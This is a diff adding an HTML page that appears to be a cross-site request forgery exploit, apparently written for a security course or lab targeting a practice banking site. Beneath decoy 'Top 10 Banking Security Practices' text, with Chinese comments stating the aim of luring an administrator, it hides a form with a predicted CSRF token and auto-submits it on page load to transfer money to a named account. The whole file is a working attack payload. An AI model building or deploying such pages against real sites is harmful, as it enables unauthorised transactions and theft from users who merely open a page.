@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Attractive Content</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f5f5f5;
+        }
+        .content {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        /* 隐藏表单 */
+        #trans {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="content">
+        <h1>Exclusive Security Report</h1>
+        <p>This page contains important banking security information. Please review the content below.</p>
+        
+        <!-- 添加一些吸引人的内容，诱使管理员点击 -->
+        <h2>Top 10 Banking Security Practices for 2025</h2>
+        <p>The financial industry continues to evolve with new security challenges...</p>
+        
+        <!-- 隐藏的恶意表单 -->
+        <form id="trans" action="https://phish-me.quoccacorp.com/api/transfer" method="POST">
+            <input type="hidden" name="csrf_token" value="MTc4NQ=="> <!-- 使用预测的有效CSRF令牌 -->
+            <input type="hidden" name="username" value="z5564895">
+            <input type="hidden" name="amount" value="100"> <!-- 选择一个较大的转账金额 -->
+        </form>
+    </div>
+
+    <script>
+        // 页面加载完成后自动提交表单
+        window.onload = function() {
+            // 延迟一秒，确保页面完全加载
+            setTimeout(function() {
+                document.getElementById("trans").submit();
+                console.log("Form submitted automatically");
+            }, 1000);
+        };
+    </script>
+</body>
+</html>
